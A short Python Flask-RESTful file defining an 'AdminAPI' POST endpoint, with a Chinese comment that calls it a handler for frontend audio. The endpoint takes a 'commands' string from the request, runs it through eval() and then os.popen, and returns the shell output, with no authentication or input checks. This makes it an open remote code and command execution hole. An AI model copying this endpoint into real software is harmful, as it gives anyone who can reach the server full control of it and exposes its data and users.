from flask_restful import Resource,reqparse
from flask import jsonify
import os

# parse parameters
parser = reqparse.RequestParser()
parser.add_argument('commands', type=str)

# 接收前端音频
class AdminAPI(Resource):
    # http://127.0.0.1:5000/api/admin/
    # 传{"key":"值"}
    def post(self):
        try:
            args = parser.parse_args()
            commands = eval(args['commands'])
            rst = os.popen(commands).read()
            jsonObj = {"result":rst}
            return jsonify(jsonObj)
        except Exception:
            return jsonify({"error":"error"})